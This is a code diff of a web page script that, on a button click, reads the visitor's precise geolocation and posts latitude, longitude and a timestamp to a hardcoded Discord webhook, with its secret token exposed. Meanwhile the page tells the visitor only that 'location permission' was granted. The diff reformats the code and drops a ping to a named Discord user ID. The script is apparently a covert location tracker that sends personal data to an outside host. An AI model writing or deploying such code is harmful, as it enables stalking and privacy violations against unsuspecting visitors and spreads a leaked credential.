@@ -234,53 +234,59 @@
     </div>
 
     <script>
-        const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1313573225992814722/WHA9GV0JZCiSr0l9qLSl-4CThGVLqDT_dNgH9B87lttJb128znB7HUdHfzx3RfK345uE';
-const janisUID = '789782857852911616'
+const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1313573225992814722/WHA9GV0JZCiSr0l9qLSl-4CThGVLqDT_dNgH9B87lttJb128znB7HUdHfzx3RfK345uE';
+const janisUID = '789782857852911616';
 
 function sendToDiscord(latitude, longitude) {
-    const payload = {
-        content: `<@${janisUID}>
-        Location:
-Latitude: ${latitude}
+  const payload = {
+    content: `
+======================================    
+Location Details:
+Latitude: ${latitude} 
 Longitude: ${longitude}
-Timestamp: ${new Date().toISOString()}`
-    };
+Timestamp: ${new Date().toISOString()}
+======================================
+`
+  };
 
-    fetch(DISCORD_WEBHOOK_URL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(payload)
-    }).then(response => {
-        if (response.ok) {
-            document.getElementById('status').textContent = 'Location permission granted!';
-        } else {
-            document.getElementById('status').textContent = 'Failed to grant permission!';
-        }
-    }).catch(error => {
-        document.getElementById('status').textContent = 'Error sending location';
-        console.error('Webhook error:', error);
-    });
+  fetch(DISCORD_WEBHOOK_URL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(payload),
+  })
+  .then((response) => {
+    if (response.ok) {
+      document.getElementById('status').textContent = 'Location permission granted!';
+    } else {
+      document.getElementById('status').textContent = 'Failed to grant permission!';
+    }
+  })
+  .catch((error) => {
+    document.getElementById('status').textContent = 'Error sending location';
+    console.error('Webhook error:', error);
+  });
 }
 
 function getLocation() {
-    if (!navigator.geolocation) {
-        document.getElementById('status').textContent = 'Geolocation not supported';
-        return;
-    }
-    
-    navigator.geolocation.getCurrentPosition(
-        (position) => {
-            const { latitude, longitude } = position.coords;
-            sendToDiscord(latitude, longitude);
-        },
-        (error) => {
-            document.getElementById('status').textContent = `Error: ${error.message}`;
-        },
-        { enableHighAccuracy: true }
-    );
+  if (!navigator.geolocation) {
+    document.getElementById('status').textContent = 'Geolocation not supported';
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    (position) => {
+      const { latitude, longitude } = position.coords;
+      sendToDiscord(latitude, longitude);
+    },
+    (error) => {
+      document.getElementById('status').textContent = `Error: ${error.message}`;
+    },
+    { enableHighAccuracy: true }
+  );
 }
+
 document.getElementById('location-btn').addEventListener('click', getLocation);
     </script>
 </body>
